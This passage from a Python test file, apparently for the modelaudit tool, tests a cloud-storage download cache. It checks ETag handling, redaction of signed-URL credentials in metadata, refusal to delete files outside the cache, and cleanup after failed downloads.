        cache = GCSCache(cache_dir=tmp_path / "cache")
        source_file = tmp_path / "artifact.bin"
        source_file.write_bytes(b"artifact")
        url = "s3://bucket/model.bin"

        cache.cache_file(url, source_file, etag="etag-v1")

        cached_path = cache.get_cached_path(url, etag="etag-v1")

        assert cached_path is not None
        assert cached_path.read_bytes() == b"artifact"

    def test_cache_with_mismatched_etag_misses(self, tmp_path: Path) -> None:
        cache = GCSCache(cache_dir=tmp_path / "cache")
        source_file = tmp_path / "artifact.bin"
        source_file.write_bytes(b"artifact")
        url = "s3://bucket/model.bin"

        cache.cache_file(url, source_file, etag="etag-v1")

        assert cache.get_cached_path(url, etag="etag-v2") is None

    def test_legacy_cache_without_etag_is_stale_miss_and_migrates_metadata(self, tmp_path: Path) -> None:
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
        cached_file = cache_dir / "aa" / "bb" / "model.bin"
        cached_file.parent.mkdir(parents=True)
        cached_file.write_bytes(b"artifact")
        signed_url = (
            "https://user:pass@bucket.s3.amazonaws.com/path/model.bin"
            "?X-Amz-Credential=secret&X-Amz-Signature=sig#fragment"
        )

        cache = GCSCache(cache_dir=cache_dir)
        cache_key = cache.get_cache_key(signed_url)
        cache.metadata_file.write_text(
            json.dumps(
                {
                    cache_key: {
                        "url": signed_url,
                        "path": str(cached_file),
                        "size": cached_file.stat().st_size,
                        "cached_at": "2026-01-01T00:00:00",
                        "last_accessed": "2026-01-01T00:00:00",
                    }
                }
            ),
            encoding="utf-8",
        )

        cache = GCSCache(cache_dir=cache_dir)

        assert cache.get_cached_path(signed_url) is None
        raw_metadata = cache.metadata_file.read_text(encoding="utf-8")
        metadata = json.loads(raw_metadata)
        entry = metadata[cache_key]
        assert "url" not in entry
        assert entry["url_sha256"] == cache_key
        assert entry["url_display"] == "https://bucket.s3.amazonaws.com/path/model.bin"
        assert "X-Amz-Credential" not in raw_metadata
        assert "X-Amz-Signature" not in raw_metadata
        assert "user:pass" not in raw_metadata

    def test_clean_old_cache_does_not_delete_outside_cache(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Cleanup must not delete files that are outside cache_dir."""
        caplog.set_level(logging.WARNING, logger="modelaudit.utils.sources.cloud_storage")
        cache = GCSCache(cache_dir=tmp_path / "cache")
        outside_file = tmp_path / "outside" / "artifact.bin"
        outside_file.parent.mkdir(parents=True, exist_ok=True)
        outside_file.write_bytes(b"artifact")

        poisoned_url = "s3://bucket/poisoned"
        poisoned_key = cache.get_cache_key(poisoned_url)
        cache.metadata[poisoned_key] = {
            "url": poisoned_url,
            "path": str(outside_file),
            "etag": None,
            "size": outside_file.stat().st_size,
            "cached_at": "2000-01-01T00:00:00",
            "last_accessed": "2000-01-01T00:00:00",
        }
        cache._save_metadata()

        cache.clean_old_cache(max_age_days=0)

        assert outside_file.exists()
        assert poisoned_key not in cache.metadata
        assert "outside cache dir" in caplog.text

    def test_cache_metadata_redacts_signed_urls_and_uses_private_permissions(self, tmp_path: Path) -> None:
        """Cache metadata should not persist raw signed URL credentials."""
        cache = GCSCache(cache_dir=tmp_path / "cache")
        source_file = tmp_path / "artifact.bin"
        source_file.write_bytes(b"artifact")
        signed_url = (
            "https://user:pass@bucket.s3.amazonaws.com/path/model.bin"
            "?X-Amz-Credential=secret&X-Amz-Signature=sig#fragment"
        )

        cache.cache_file(signed_url, source_file, etag="etag-value")

        raw_metadata = cache.metadata_file.read_text(encoding="utf-8")
        metadata = json.loads(raw_metadata)
        entry = metadata[cache.get_cache_key(signed_url)]
        assert "url" not in entry
        assert entry["url_sha256"] == cache.get_cache_key(signed_url)
        assert entry["url_display"] == "https://bucket.s3.amazonaws.com/path/model.bin"
        assert "X-Amz-Credential" not in raw_metadata
        assert "X-Amz-Signature" not in raw_metadata
        assert "user:pass" not in raw_metadata
        assert "fragment" not in raw_metadata
        if os.name != "nt":
            assert stat.S_IMODE(cache.metadata_file.stat().st_mode) == 0o600


class TestCloudDownloadCleanup:
    """Regression tests for temporary download directory cleanup."""

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("modelaudit.utils.sources.cloud_storage.retry_with_backoff")
    @patch("fsspec.filesystem")
    def test_download_failure_cleans_temp_dir(
        self,
        mock_fs_class: MagicMock,
        mock_retry_with_backoff: MagicMock,
        mock_analyze: AsyncMock,
        tmp_path: Path,
    ) -> None:
        """Failed single-file downloads should remove auto-created temp directories."""
        fs = make_fs_mock()
        fs.info.return_value = {"type": "file", "size": 1024}
        fs.get.side_effect = RuntimeError("network failure")
        mock_fs_class.return_value = fs

        mock_analyze.return_value = {
            "type": "file",
            "size": 1024,
            "name": "model.bin",
            "human_size": "1.0 KB",
            "estimated_time": "1 second",
        }
        mock_retry_with_backoff.side_effect = lambda *_args, **_kwargs: lambda func: func

        temp_download_dir = tmp_path / "modelaudit_cloud_temp"
        temp_download_dir.mkdir(parents=True, exist_ok=True)
        with (
            patch("modelaudit.utils.sources.cloud_storage.tempfile.mkdtemp", return_value=str(temp_download_dir)),
            pytest.raises(RuntimeError, match="network failure"),
        ):
            download_from_cloud("s3://bucket/model.bin", use_cache=False, show_progress=False)

        assert not temp_download_dir.exists()


def test_filter_scannable_files_recognizes_pdiparams() -> None:
    files = [{"path": "model.pdiparams"}, {"path": "notes.csv"}, {"path": "preview.png"}]

    assert filter_scannable_files(files) == [{"path": "model.pdiparams"}]


def test_filter_scannable_files_uses_registry_extensions():
    files = [{"path": "model.nemo"}, {"path": "model.rds"}, {"path": "README.md"}, {"path": "notes.csv"}]
    assert filter_scannable_files(files) == files[:3]


def test_filter_scannable_files_handles_tar_gz_and_tgz():
    files = [{"path": "archive.tar.gz"}, {"path": "weights.tgz"}]
    assert filter_scannable_files(files) == files
